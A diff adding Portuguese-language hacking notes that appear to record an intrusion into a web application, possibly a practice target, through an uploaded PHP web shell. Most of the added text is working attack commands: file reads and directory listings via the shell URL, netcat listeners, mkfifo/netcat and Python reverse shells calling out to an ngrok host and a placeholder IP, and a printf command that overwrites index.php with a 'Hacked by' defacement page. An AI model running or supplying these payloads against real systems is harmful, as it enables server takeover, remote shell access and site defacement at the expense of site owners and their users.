@@ -574,6 +574,145 @@ Alguns comandos que posso utilizar na URL das páginas (inserir código SQL)
 
 ## SHELL Hacking
 
+### PHP Info
+
+**Server Shell info**: `PHP Version 5.6.40-29+ubuntu18.04.1+deb.sury.org+1`
+
 ```bash
 http://www.bancocn.com/admin/uploads/shellphp.php7?cmd=<LINUX COMMAND>
-``
+```
+
+**Whoami**: `www-data`
+
+Para ver as pastas do servidor e se localizar é só utilizar o comando `pwd`
+
+```bash
+/var/www/html/admin/uploads 
+```
+
+```bash
+$ ls ../
+del.php footer.php header.php index.php login.php logout.php new.php uploads
+
+$ ls../../
+admin all.php assets cat.php classes css footer.php header.php images index.php robots.txt show.php 
+```
+
+Fiz uso do comando `cat` para ler o arquivo index
+
+```bash
+cat ../../index.php
+```
+
+### Invadinho o SHELL
+
+Criando uma porta (SERVIDOR)
+
+```bash
+nc -lvp 789
+```
+
+- `-l` faz com que netcat entre no modo de escuta.
+- `-v` habilita o modo verbose para mais informações.
+- `-p` 4444 especifica a porta 4444.
+
+Criando uma porta (CLIENTE)
+
+```bash
+nc <IP> 789
+```
+
+> **Netcat Help**
+
+```bash
+nc -h
+OpenBSD netcat (Debian patchlevel 1.226-1ubuntu2)
+usage: nc [-46CDdFhklNnrStUuvZz] [-I length] [-i interval] [-M ttl]
+	  [-m minttl] [-O length] [-P proxy_username] [-p source_port]
+	  [-q seconds] [-s sourceaddr] [-T keyword] [-V rtable] [-W recvlimit]
+	  [-w timeout] [-X proxy_protocol] [-x proxy_address[:port]]
+	  [destination] [port]
+	Command Summary:
+		-4		Use IPv4
+		-6		Use IPv6
+		-b		Allow broadcast
+		-C		Send CRLF as line-ending
+		-D		Enable the debug socket option
+		-d		Detach from stdin
+		-F		Pass socket fd
+		-h		This help text
+		-I length	TCP receive buffer length
+		-i interval	Delay interval for lines sent, ports scanned
+		-k		Keep inbound sockets open for multiple connects
+		-l		Listen mode, for inbound connects
+		-M ttl		Outgoing TTL / Hop Limit
+		-m minttl	Minimum incoming TTL / Hop Limit
+		-N		Shutdown the network socket after EOF on stdin
+		-n		Suppress name/port resolutions
+		-O length	TCP send buffer length
+		-P proxyuser	Username for proxy authentication
+		-p port		Specify local port for remote connects
+		-q secs		quit after EOF on stdin and delay of secs
+		-r		Randomize remote ports
+		-S		Enable the TCP MD5 signature option
+		-s sourceaddr	Local source address
+		-T keyword	TOS value
+		-t		Answer TELNET negotiation
+		-U		Use UNIX domain socket
+		-u		UDP mode
+		-V rtable	Specify alternate routing table
+		-v		Verbose
+		-W recvlimit	Terminate after receiving a number of packets
+		-w timeout	Timeout for connects and final net reads
+		-X proto	Proxy protocol: "4", "5" (SOCKS) or "connect"
+		-x addr[:port]	Specify proxy address and port
+		-Z		DCCP mode
+		-z		Zero-I/O mode [used for scanning]
+	Port numbers can be individual or ranges: lo-hi [inclusive]
+```
+
+##### Método Alternativo (Se `-e` Não Estiver Disponível):
+
+Se a sua versão do `netcat` não suporta a opção `-e`, você pode usar `mkfifo` para criar um shell reverso.
+
+No servidor (ouvinte):
+```bash
+nc -lvp 4444
+```
+
+No cliente (máquina alvo):
+```bash
+mkfifo /tmp/fifo && nc <IP_do_servidor> <PORT> < /tmp/fifo | /bin/bash > /tmp/fifo 2>&1; rm /tmp/fifo
+```
+
+- `mkfifo /tmp/fifo` cria um pipe nomeado temporário.
+- `nc <IP_do_servidor> <PORT> < /tmp/fifo` conecta ao servidor e redireciona a saída do `fifo` para a conexão `netcat`.
+- `/bin/bash > /tmp/fifo 2>&1` redireciona a saída do bash para o `fifo`.
+- `rm /tmp/fifo` remove o `fifo` após a execução.
+
+Resultado do comando (+ngrok):
+```bash
+ubuntu 18
+
+http://www.bancocn.com/admin/uploads/shellphp.php7?cmd=nc%200.tcp.ngrok.io%2015333%20-e%20/bin/bash
+```
+
+```bash
+mkfifo /tmp/fifo && nc 0.tcp.ngrok.io 15333 < /tmp/fifo | /bin/bash > /tmp/fifo 2>&1; rm /tmp/fifo
+```
+
+Shell Reverse (Python)
+```bash
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
+
+```
+http://www.bancocn.com/admin/uploads/shellphp.php7?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
+
+Html ( [HTML Compressor](https://codebeautify.org/html-compressor) )
+
+Inserindo `html` no arquivo index:
+```bash
+printf "<<<?php echo '<html><head><title>Hacked by Baku-Stark</title><style>*{margin:0;padding:0;box-sizing:border-box;font-family:Poppins,sans-serif}body{width:100%;height:100vh;display:flex;align-items:center;justify-content:center;background-color:#e1dbdf}div.main-container{text-align:center}h1,p{color:#111;margin-bottom:5vh}p{font-size:2.5rem}p a{font-weight:700;text-decoration:none;animation:purplehollow .5s ease-in-out infinite;font-family:'Gill Sans','Gill Sans MT',Calibri,'Trebuchet MS',sans-serif}@keyframes purplehollow{0%{color:red}25%{color:#0ff}75%{color:purple}}</style></head><body><div class='main-container'><h1>Site hacked!!!</h1><figure><img src='https://media1.tenor.com/m/P-mmEgNIquYAAAAC/gojo-satoru.gif'></figure><div><p><strong>Hacked by</strong>:<a href='https://github.com/Baku-Stark' target='_blank'>Baku-Stark</a></p></div></div></body></html>'; ?>" > ../../index.php
+```
